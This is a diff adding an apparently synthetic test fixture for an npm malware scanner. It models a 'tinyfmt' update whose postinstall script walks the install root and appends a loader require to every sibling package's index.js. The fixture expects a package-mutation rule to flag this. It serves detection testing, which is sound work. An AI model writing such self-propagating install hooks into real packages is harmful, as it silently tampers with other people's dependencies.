@@ -1,0 +1,48 @@
+{
+  "id": "install-root-parent-dir-walk",
+  "title": "Postinstall hook climbs one directory and appends a loader to every sibling package",
+  "ecosystem": "npm",
+  "verdict": "malicious",
+  "threatClass": "self-propagating-worm",
+  "source": "synthetic",
+  "intent": "Model local propagation that never names node_modules or a parent-escape literal: a root-level install script takes path.dirname(__dirname), which is the directory its dependencies are unpacked into, and walks it. Inert fixture; the target is a fixture path, not a real tree. The source never names the install root, so co-occurrence scoring misses it; reported as a frontier case for propagation.package-mutation.",
+  "expectMinRisk": "high",
+  "expectAnyRule": ["propagation.package-mutation"],
+  "category": "install-time-self-propagation",
+  "previousPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.0"
+  },
+  "stagedPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.1",
+    "scripts": {
+      "postinstall": "node install.js"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 35,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.0\"}"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 79,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.1\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "install.js",
+      "size": 330,
+      "sha256": "install-js",
+      "flags": [],
+      "textSample": "const fs = require('node:fs');\nconst path = require('node:path');\n// Every package installed beside this one.\nconst siblings = path.dirname(__dirname);\nfor (const name of fs.readdirSync(siblings)) {\n  const entry = path.join(siblings, name, 'index.js');\n  if (fs.existsSync(entry)) fs.appendFileSync(entry, \"\\nrequire('tinyfmt/loader');\\n\");\n}\n"
+    }
+  ]
+}
